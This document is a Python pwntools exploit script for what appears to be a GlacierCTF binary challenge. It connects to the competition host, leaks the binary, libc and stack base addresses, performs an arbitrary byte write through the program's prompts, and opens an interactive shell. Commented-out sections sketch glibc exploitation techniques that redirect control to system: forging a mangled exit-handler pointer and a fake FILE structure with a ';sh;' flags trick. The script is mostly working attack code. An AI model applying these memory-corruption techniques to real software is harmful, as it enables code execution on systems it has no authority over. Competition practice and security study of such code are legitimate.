from pwn import *
import sys
import os
#Cre: vilex1337

_path = "./challenge_patched"
exe = context.binary = ELF(_path, checksec=False)
libc = ELF("./libc.so.6", checksec=False)
ld = ELF("./ld-linux-x86-64.so.2", checksec=False)
add = 'challs.glacierctf.com'
port = 13377
cmd = f'''
    set solib-search-path {os.getcwd()}
    b *main+386
    b *main+415
    b *main+445
    continue
'''
_mode = 0
_arch = 64

def conn():
    global _mode
    if(len(sys.argv) == 1):
        _mode = 2
        return gdb.debug(_path, cmd)
    if(sys.argv[1] == 'exp'):
        _mode = 3
        return remote(add, port)
    _mode = 1
    return process(_path)

rol = lambda val, r_bits, max_bits: \
    (val << r_bits%max_bits) & (2**max_bits-1) | \
    ((val & (2**max_bits-1)) >> (max_bits-(r_bits%max_bits)))

ror = lambda val, r_bits, max_bits: \
    ((val & (2**max_bits-1)) >> r_bits%max_bits) | \
    (val << (max_bits-(r_bits%max_bits)) & (2**max_bits-1))

def encrypt(v, key):
    return p(rol(v ^ key, 0x11, 64))

#############  next | count  | type (cxa) | addr                             | arg               | not used
#onexit_fun =  p(0) + p(1)  +  p(4)       + encrypt(libc.sym['system'], key) + p(heap + 0x2c0)  +  p(0)
'''
_op_file = FileStructure()
_op_file.unknown2 = p(0)*2 + p(libc.sym["system"]) + p(0)*3 + p(libc.sym["_IO_wfile_jumps"] - 0x20 ) + p(libc.sym["_IO_2_1_stdout_"] +0x50)
_op_file._wide_data = libc.sym["_IO_2_1_stdout_"]
_op_file.flags = 0xfbad20b1 + (int.from_bytes(b';sh;', 'little') << 32)
_op_file._lock = libc.address + 0x21a200
_tmp_file = bytes(_op_file)
'''

def p(_data):
    if(_arch == 64):
        return p64(_data, endian = 'little')
    return p32(_data, endian = 'little')

chall = conn()

def _send(_rgx, _data):
    chall.sendafter(_rgx, _data)

def _sendline(_rgx, _data):
    chall.sendlineafter(_rgx, _data)

#rop = ROP(libc)
#rop.find_gadget(['pop rdi', 'ret'])[0]
#log.info

def check():
    chall.interactive()
    exit()

def main():

    for i in range(3):
        chall.recvline()
    exe.address = int(chall.recv(12), 16)

    for i in range(7):
        chall.recvline()
    libc.address = int(chall.recv(12), 16)

    chall.recvuntil(b'card deck stacks ')
    stack = int(chall.recv(14), 16)

    log.info(f"Exe base: {hex(exe.address)}")
    log.info(f"Libc: {hex(libc.address)}")
    log.info(f"Stack: {hex(stack)}")

    target1 = stack + 0x100
    val1 = ord('s')

    log.info(f"{hex(target1)}: {val1}")
    _sendline(b'wish?', hex(target1).encode()[2:])
    _sendline(b'wish here?', hex(val1).encode()[2:])
    check()

if __name__ == "__main__":
    main()
